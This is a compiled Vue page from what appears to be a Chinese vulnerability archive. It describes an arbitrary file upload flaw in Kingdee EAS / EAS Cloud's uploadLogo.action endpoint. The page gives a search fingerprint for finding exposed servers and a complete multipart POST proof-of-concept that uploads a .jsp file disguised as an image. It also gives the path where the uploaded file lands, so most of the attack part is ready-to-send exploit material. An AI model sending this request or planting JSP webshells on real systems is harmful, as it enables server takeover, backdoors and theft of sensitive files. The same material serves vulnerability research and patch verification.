import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const d={},t=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。金蝶 EAS 及 EAS Cloud 在 uploadLogo.action 存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>金蝶OA EAS系统</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;/easportal/&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231116141032395.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>poc</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /plt_portal/setting/uploadLogo.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycxkT8bV6WLIUzm2p

------WebKitFormBoundarycxkT8bV6WLIUzm2p
Content-Disposition: form-data; name=&quot;chooseLanguage_top&quot;
ch

------WebKitFormBoundarycxkT8bV6WLIUzm2p
Content-Disposition: form-data; name=&quot;dataCenter&quot;

xx
------WebKitFormBoundarycxkT8bV6WLIUzm2p 
Content-Disposition: form-data; name=&quot;insId&quot;

------WebKitFormBoundarycxkT8bV6WLIUzm2p
Content-Disposition: form-data; name=&quot;type&quot;

top
------WebKitFormBoundarycxkT8bV6WLIUzm2p
Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;text.jsp&quot;
Content-Type: image/jpeg

Test
------WebKitFormBoundarycxkT8bV6WLIUzm2p--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231116141050903.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/portal/res/file/upload/xxx.jsp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,13),s=[t];function o(l,r){return i(),n("div",null,s)}const m=e(d,[["render",o],["__file","金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞.html.vue"]]);export{m as default};
